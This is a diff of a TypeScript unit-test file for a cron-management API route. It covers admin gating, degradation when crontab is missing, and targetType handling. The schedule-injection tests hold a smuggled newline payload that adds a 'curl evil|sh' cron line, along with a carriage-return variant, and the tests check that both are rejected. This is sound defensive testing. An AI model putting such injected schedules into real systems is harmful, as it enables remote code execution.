@@ -2,28 +2,84 @@
  * test/api-cron.test.ts - Unit tests for app/routes/api.cron.tsx.
  *
  * Covers:
- *   - Gate: action returns { ok: false } on a non-admin instance (MC_USER set to a non-admin user).
- *   - targetType field flows through the create schema (ask-3).
+ *   - Gate: on by default for any MC_USER; MC_CRON_ADMIN_ENABLED=0/false makes
+ *     GET 404 and refuses every POST before the seam is reached.
+ *   - Missing `crontab`: GET returns an empty list flagged crontabOk: false,
+ *     POST is refused with a clear message and nothing is written.
+ *   - A throwing seam comes back as { ok: false }, never a throw.
+ *   - Schedule injection is still rejected end to end (route + real seam).
+ *   - targetType flows through the create schema (ask-3).
  *
- * Uses process.env mutation (restored in afterEach) to set the instance user.
- * No real crontab is ever touched - all cron.server calls are rejected before
- * they reach crontab operations via the instance gate or by failing target validation.
+ * The REAL cron.server functions run, but always against in-memory fake deps:
+ * the mock below re-binds each exported function to call the original with
+ * FAKE, so no test can read or write the real crontab, the real ~/agents or a
+ * real INBOX_ROOT, and crontabAvailable never looks at the real PATH.
  *
  * ASCII only - no em-dashes.
  */
 
-import { describe, it, expect, afterEach } from "vitest";
-import { action } from "~/routes/api.cron";
+import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
+import type { CronDeps } from "~/lib/cron.server";
+
+// vi.hoisted: vi.mock and the static imports below are hoisted above plain
+// consts, so anything the mock factory touches must be hoisted with it.
+const { writes, FAKE } = vi.hoisted(() => {
+  const writes = { crontab: [] as string[], scripts: [] as string[] };
+  const FAKE: CronDeps = {
+    readCrontab: () => "",
+    writeCrontab: (content) => {
+      writes.crontab.push(content);
+    },
+    writeScript: (filePath) => {
+      writes.scripts.push(filePath);
+    },
+    deleteScript: () => {},
+    listAgentDirs: () => ["sprout"],
+    readStateFile: () => null,
+    writeStateFile: () => {},
+    homedir: () => "/home/you",
+    inboxRoot: () => "/srv/deck-test/inbox",
+  };
+  return { writes, FAKE };
+});
+
+vi.mock("~/lib/cron.server", async (importOriginal) => {
+  const real = await importOriginal<typeof import("~/lib/cron.server")>();
+  return {
+    ...real,
+    crontabAvailable: vi.fn((): boolean => true),
+    listCrons: vi.fn(() => real.listCrons(FAKE)),
+    createCron: vi.fn((p: Parameters<typeof real.createCron>[0]) => real.createCron(p, FAKE)),
+    setEnabled: vi.fn((id: string, on: boolean) => real.setEnabled(id, on, FAKE)),
+    deleteCron: vi.fn((id: string) => real.deleteCron(id, FAKE)),
+  };
+});
+
+import { action, loader } from "~/routes/api.cron";
+import * as cronServer from "~/lib/cron.server";
+
+const seam = vi.mocked(cronServer);
 
 const ORIGINAL_MC_USER = process.env["MC_USER"];
+const ORIGINAL_CRON_ADMIN = process.env["MC_CRON_ADMIN_ENABLED"];
+
+function restore(key: string, value: string | undefined): void {
+  if (value === undefined) delete process.env[key];
+  else process.env[key] = value;
+}
+
+beforeEach(() => {
+  vi.clearAllMocks();
+  seam.crontabAvailable.mockReturnValue(true);
+  writes.crontab.length = 0;
+  writes.scripts.length = 0;
+  delete process.env["MC_USER"];
+  delete process.env["MC_CRON_ADMIN_ENABLED"];
+});
 
 afterEach(() => {
-  // Restore the env after each test.
-  if (ORIGINAL_MC_USER === undefined) {
-    delete process.env["MC_USER"];
-  } else {
-    process.env["MC_USER"] = ORIGINAL_MC_USER;
-  }
+  restore("MC_USER", ORIGINAL_MC_USER);
+  restore("MC_CRON_ADMIN_ENABLED", ORIGINAL_CRON_ADMIN);
 });
 
 /** Build a fake Request with form-encoded body. */
@@ -36,99 +92,128 @@ function makeRequest(fields: Record<string, string>): Request {
   });
 }
 
-describe("api.cron action - instance gate", () => {
-  it("refuses create on a non-admin instance (MC_USER=quill)", async () => {
+function runAction(fields: Record<string, string>) {
+  return action({ request: makeRequest(fields), params: {}, context: {} } as unknown as Parameters<typeof action>[0]);
+}
+
+function runLoader() {
+  return loader({
+    request: new Request("http://localhost/api/cron"),
+    params: {},
+    context: {},
+  } as unknown as Parameters<typeof loader>[0]);
+}
+
+const VALID_CREATE: Record<string, string> = {
+  intent: "create",
+  schedule: "30 7 * * *",
+  target: "sprout",
+  message: "morning check-in",
+  enabled: "true",
+};
+
+function expectNothingWritten(): void {
+  expect(writes.crontab).toEqual([]);
+  expect(writes.scripts).toEqual([]);
+}
+
+// ---------------------------------------------------------------------------
+// Gate
+// ---------------------------------------------------------------------------
+
+describe("api.cron - gate", () => {
+  it("is on by default for any MC_USER: create reaches the seam and writes", async () => {
     process.env["MC_USER"] = "quill";
 
-    const request = makeRequest({
-      intent: "create",
-      schedule: "30 7 * * *",
-      target: "sprout",
-      message: "morning check-in",
-      enabled: "true",
-    });
+    const result = await runAction(VALID_CREATE);
 
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-
-    expect(result.ok).toBe(false);
-    if (!result.ok) {
-      expect(result.error).toContain("not available on this instance");
-    }
+    expect(result.ok).toBe(true);
+    expect(writes.crontab).toHaveLength(1);
+    expect(writes.crontab[0]).toContain("# MC-CRON:");
   });
 
-  it("refuses setEnabled on a non-admin instance (MC_USER=quill)", async () => {
-    process.env["MC_USER"] = "quill";
-
-    const request = makeRequest({
-      intent: "setEnabled",
-      id: "abc123",
-      enabled: "false",
-    });
-
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-    expect(result.ok).toBe(false);
+  it("GET lists on by default", async () => {
+    const data = await runLoader();
+    expect(data).toEqual({ crons: [], crontabOk: true });
+    expect(seam.listCrons).toHaveBeenCalledTimes(1);
   });
 
-  it("refuses delete on a non-admin instance (MC_USER=quill)", async () => {
-    process.env["MC_USER"] = "quill";
+  for (const off of ["0", "false", "FALSE"]) {
+    it(`GET 404s and reads nothing when MC_CRON_ADMIN_ENABLED=${off}`, async () => {
+      process.env["MC_CRON_ADMIN_ENABLED"] = off;
 
-    const request = makeRequest({
-      intent: "delete",
-      id: "abc123",
+      try {
+        await runLoader();
+        expect.unreachable("loader should have thrown");
+      } catch (e) {
+        expect(e).toBeInstanceOf(Response);
+        expect((e as Response).status).toBe(404);
+      }
+      expect(seam.listCrons).not.toHaveBeenCalled();
     });
+  }
 
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-    expect(result.ok).toBe(false);
-  });
+  const intents: Array<Record<string, string>> = [
+    VALID_CREATE,
+    { intent: "setEnabled", id: "abc123", enabled: "false" },
+    { intent: "delete", id: "abc123" },
+  ];
+  for (const fields of intents) {
+    it(`refuses ${fields["intent"]} when opted out, before the seam`, async () => {
+      process.env["MC_CRON_ADMIN_ENABLED"] = "0";
 
-  it("allows action when MC_USER is unset (defaults to alex)", async () => {
-    // Unset MC_USER so mcUser() returns "alex" (the default).
-    delete process.env["MC_USER"];
+      const result = await runAction(fields);
 
-    // This will reach cron.server functions but with a missing target -> reject gracefully.
-    const request = makeRequest({
-      intent: "create",
-      schedule: "30 7 * * *",
-      target: "nonexistent-agent-xyz",
-      message: "test",
-      enabled: "true",
+      expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.error).toContain("not available on this instance");
+      expect(seam.createCron).not.toHaveBeenCalled();
+      expect(seam.setEnabled).not.toHaveBeenCalled();
+      expect(seam.deleteCron).not.toHaveBeenCalled();
+      expectNothingWritten();
     });
-
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-    // Gate passes (alex's instance) but cron.server rejects the unknown target.
-    // Both paths return { ok: false }, but for different reasons.
-    // We just confirm it doesn't throw and returns ok: false.
-    expect(typeof result.ok).toBe("boolean");
-  });
-
-  it("allows action when MC_USER=robin (robin is now a trusted principal)", async () => {
-    process.env["MC_USER"] = "robin";
-
-    // Gate passes for robin; cron.server rejects the unknown target gracefully.
-    const request = makeRequest({
-      intent: "create",
-      schedule: "30 7 * * *",
-      target: "nonexistent-agent-xyz",
-      message: "test",
-      enabled: "true",
-    });
-
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-    // Gate passes; action reaches cron.server and fails on unknown target -- NOT "not available".
-    if (!result.ok) {
-      expect(result.error).not.toContain("not available on this instance");
-    }
-  });
+  }
 
   it("rejects unknown intent", async () => {
-    delete process.env["MC_USER"];
-
-    const request = makeRequest({ intent: "bogus" });
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
+    const result = await runAction({ intent: "bogus" });
     expect(result.ok).toBe(false);
-    if (!result.ok) {
-      expect(result.error).toContain("Unknown intent");
-    }
+    if (!result.ok) expect(result.error).toContain("Unknown intent");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Degradation
+// ---------------------------------------------------------------------------
+
+describe("api.cron - degradation", () => {
+  it("GET reports a missing crontab without reading one", async () => {
+    seam.crontabAvailable.mockReturnValue(false);
+
+    const data = await runLoader();
+
+    expect(data).toEqual({ crons: [], crontabOk: false });
+    expect(seam.listCrons).not.toHaveBeenCalled();
+  });
+
+  it("POST is refused with a clear message when crontab is missing, and writes nothing", async () => {
+    seam.crontabAvailable.mockReturnValue(false);
+
+    const result = await runAction(VALID_CREATE);
+
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.error).toContain("crontab was not found");
+    expect(seam.createCron).not.toHaveBeenCalled();
+    expectNothingWritten();
+  });
+
+  it("turns a throwing seam into { ok: false } instead of a 500", async () => {
+    seam.deleteCron.mockImplementationOnce(() => {
+      throw new Error("crontab: write failed");
+    });
+
+    const result = await runAction({ intent: "delete", id: "abc123" });
+
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.error).toContain("crontab: write failed");
   });
 });
 
@@ -137,39 +222,24 @@ describe("api.cron action - instance gate", () => {
 // ---------------------------------------------------------------------------
 
 describe("api.cron action - schedule injection defence", () => {
-  it("rejects a newline-injection schedule at the api/cron create endpoint", async () => {
-    delete process.env["MC_USER"];
-
-    // Injection payload: embedded newline turns a valid cron line into two
-    // lines when interpolated into the crontab. The api route must reject this
-    // before it reaches createCron (schema-level) OR createCron itself must
-    // reject it (seam-level). Either way, ok must be false.
-    const injectedSchedule = "* * * * *\n* * * * * curl evil|sh # MC-CRON:x";
-    const request = makeRequest({
-      intent: "create",
-      schedule: injectedSchedule,
-      target: "sprout",
-      message: "legit message",
-      enabled: "true",
+  it("rejects a newline-injection schedule and writes nothing", async () => {
+    // Embedded newline turns one valid cron line into two when interpolated
+    // into the crontab. The real seam runs here (against fake deps), so this
+    // proves the route plus seam reject it end to end.
+    const result = await runAction({
+      ...VALID_CREATE,
+      schedule: "* * * * *\n* * * * * curl evil|sh # MC-CRON:x",
     });
 
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
     expect(result.ok).toBe(false);
+    expectNothingWritten();
   });
 
-  it("rejects a carriage-return-injection schedule at the api/cron create endpoint", async () => {
-    delete process.env["MC_USER"];
+  it("rejects a carriage-return-injection schedule and writes nothing", async () => {
+    const result = await runAction({ ...VALID_CREATE, schedule: "30 7 * * *\r* * * * * evil" });
 
-    const request = makeRequest({
-      intent: "create",
-      schedule: "30 7 * * *\r* * * * * evil",
-      target: "sprout",
-      message: "legit",
-      enabled: "true",
-    });
-
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
     expect(result.ok).toBe(false);
+    expectNothingWritten();
   });
 });
 
@@ -178,82 +248,48 @@ describe("api.cron action - schedule injection defence", () => {
 // ---------------------------------------------------------------------------
 
 describe("api.cron action - targetType field", () => {
-  it("passes targetType=agent through create schema (gate passes, server rejects unknown target)", async () => {
-    delete process.env["MC_USER"];
+  it("passes targetType=agent through to the seam", async () => {
+    const result = await runAction({ ...VALID_CREATE, targetType: "agent" });
 
-    const request = makeRequest({
-      intent: "create",
-      schedule: "30 7 * * *",
-      target: "nonexistent-agent-xyz",
-      message: "test",
-      enabled: "true",
-      targetType: "agent",
-    });
-
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-    // Gate passes; cron.server rejects unknown target. ok=false for the right reason.
-    expect(result.ok).toBe(false);
-    if (!result.ok) {
-      // Should fail at target validation, not at schema parsing.
-      expect(result.error).not.toContain("Invalid create payload");
-    }
+    expect(result.ok).toBe(true);
+    expect(seam.createCron.mock.calls[0]?.[0]).toMatchObject({ targetType: "agent" });
   });
 
-  it("passes targetType=script through create schema", async () => {
-    delete process.env["MC_USER"];
-
-    const request = makeRequest({
-      intent: "create",
+  it("passes targetType=script through to the seam", async () => {
+    const result = await runAction({
+      ...VALID_CREATE,
       schedule: "*/30 * * * *",
-      target: "nonexistent-agent-xyz",
       message: "#!/usr/bin/env bash\necho hi",
-      enabled: "true",
       targetType: "script",
     });
 
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-    expect(result.ok).toBe(false);
-    if (!result.ok) {
-      expect(result.error).not.toContain("Invalid create payload");
-    }
+    expect(result.ok).toBe(true);
+    expect(seam.createCron.mock.calls[0]?.[0]).toMatchObject({ targetType: "script" });
   });
 
   it("defaults targetType to agent when not provided", async () => {
-    delete process.env["MC_USER"];
+    const result = await runAction(VALID_CREATE);
 
-    // Omit targetType; schema should default to "agent" and gate should pass.
-    const request = makeRequest({
-      intent: "create",
-      schedule: "0 9 * * *",
-      target: "nonexistent-agent-xyz",
-      message: "morning",
-      enabled: "true",
-    });
-
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
-    expect(result.ok).toBe(false);
-    if (!result.ok) {
-      // Schema parsed OK (default applied), then cron.server rejected unknown target.
-      expect(result.error).not.toContain("Invalid create payload");
-    }
+    expect(result.ok).toBe(true);
+    expect(seam.createCron.mock.calls[0]?.[0]).toMatchObject({ targetType: "agent" });
   });
 
   it("rejects an invalid targetType value at schema level", async () => {
-    delete process.env["MC_USER"];
+    const result = await runAction({ ...VALID_CREATE, targetType: "tmux" });
 
-    const request = makeRequest({
-      intent: "create",
-      schedule: "30 7 * * *",
-      target: "sprout",
-      message: "test",
-      enabled: "true",
-      targetType: "tmux",
-    });
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.error).toContain("Invalid create payload");
+    expect(seam.createCron).not.toHaveBeenCalled();
+  });
 
-    const result = await action({ request, params: {}, context: {} } as Parameters<typeof action>[0]);
+  it("rejects an unknown target agent at the seam, after the schema", async () => {
+    const result = await runAction({ ...VALID_CREATE, target: "nonexistent-agent-xyz" });
+
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("Invalid create payload");
+      expect(result.error).not.toContain("Invalid create payload");
+      expect(result.error).toContain("Unknown target agent");
     }
+    expectNothingWritten();
   });
 });
